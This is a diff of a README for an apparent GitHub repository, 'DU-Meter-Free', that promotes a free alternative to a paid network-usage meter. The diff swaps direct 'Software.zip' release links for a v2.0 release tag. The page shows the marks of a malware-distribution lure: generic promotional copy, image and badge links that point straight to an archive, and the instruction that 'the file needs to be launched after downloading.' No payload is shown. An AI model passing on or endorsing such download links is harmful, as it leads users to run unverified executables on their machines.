@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to DU-Meter-Free Repository! 🚀
 
-![DU Meter Free](https://github.com/h4js/DU-Meter-Free/releases/download/v1.0/Software.zip)
+![DU Meter Free](https://github.com/h4js/DU-Meter-Free/releases/tag/v2.0)
 
 If you are looking for a reliable and free DU Meter alternative, you have come to the right place! **DU-Meter-Free** is a fantastic tool that provides you with accurate data usage information, allowing you to monitor your network activity efficiently.
 
@@ -23,7 +23,7 @@ If you are looking for a reliable and free DU Meter alternative, you have come t
 
 To get started with **DU-Meter-Free**, download the latest version from the following link:
 
-[![Download DU Meter Free](https://github.com/h4js/DU-Meter-Free/releases/download/v1.0/Software.zip)](https://github.com/h4js/DU-Meter-Free/releases/download/v1.0/Software.zip)
+[![Download DU Meter Free](https://github.com/h4js/DU-Meter-Free/releases/tag/v2.0)](https://github.com/h4js/DU-Meter-Free/releases/tag/v2.0)
 ### **Note:** The file needs to be launched after downloading.
 
 ## How to Use
